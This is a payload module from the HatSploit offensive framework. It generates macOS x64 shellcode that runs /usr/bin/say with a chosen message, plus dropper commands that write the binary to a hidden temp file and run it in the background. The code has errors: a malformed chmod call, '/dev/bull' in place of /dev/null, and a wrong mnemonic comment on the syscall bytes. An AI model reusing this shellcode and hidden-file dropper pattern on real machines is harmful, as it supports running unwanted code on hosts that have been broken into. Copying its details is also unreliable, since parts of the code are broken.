#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import struct

from core.lib.payload import HatSploitPayload

from utils.payload.payload_generator import payload_generator

class HatSploitPayload(HatSploitPayload):
    payload_generator = payload_generator()

    details = {
        'Name': "macOS x64 Say",
        'Payload': "macos/x64/say",
        'Authors': [
            'enty8080'
        ],
        'Description': "Say Payload for macOS x64."
    }

    options = {
        'MESSAGE': {
            'Description': "Message to say.",
            'Value': "Ruslanchik",
            'Type': None,
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "macho",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        message, executable_format = self.parser.parse_options(self.options)

        message = (message + '\x00').encode()
        call = b'\xe8' + struct.pack("<I", len(message) + 0xd)
        
        if not executable_format in self.payload_generator.formats.keys():
            self.badges.output_error("Invalid executable format!")
            return

        self.badges.output_process("Generating shellcode...")
        shellcode = (
            b"\x48\x31\xC0" +          # xor rax,rax
            b"\xB8\x3B\x00\x00\x02" +  # mov eax,0x200003b
            call +
            b"/usr/bin/say\x00" +
            message +
            b"\x48\x8B\x3C\x24" +      # mov rdi,[rsp]
            b"\x4C\x8D\x57\x0D" +      # lea r10,[rdi+0xd]
            b"\x48\x31\xD2" +          # xor rdx,rdx
            b"\x52" +                  # push rdx
            b"\x41\x52" +              # push r10
            b"\x57" +                  # push rdi
            b"\x48\x89\xE6" +          # mov rsi,rsp
            b"\x0F\x05"                # loadall286
        )

        self.badges.output_process("Generating payload...")
        payload = self.payload_generator.generate(executable_format, 'x64', shellcode)

        instructions = ""
        instructions += "cat >/private/var/tmp/.payload;"
        instructions += "chmod +x 777 /private/var/tmp/.payload;"
        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/bull &"
        instructions += "\n"

        self.payload = payload
        self.instructions = instructions
        self.action = 'one_side'
